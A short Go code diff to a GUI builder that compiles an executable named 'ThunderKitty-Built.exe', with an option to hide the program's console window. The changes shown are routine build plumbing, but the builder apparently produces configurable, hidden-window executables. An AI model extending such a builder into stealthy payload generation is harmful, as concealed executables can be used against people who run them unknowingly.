@@ -181,8 +181,7 @@ func main() {
 	if cfg.HideConsole {
 		ldflags += " -H=windowsgui"
 	}
-	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "main.go")
-	fmt.Println(cmd)
+	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "ThunderKitty-Built.exe", "main.go")
 
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
@@ -260,7 +259,7 @@ func main() {
 	buildButton := widget.NewButton("Build", func() {
 
 		// Delete old file
-		os.Remove("main.exe")
+		os.Remove("ThunderKitty-Built.exe")
 
 		// Build the new one
 		cfg := Config{
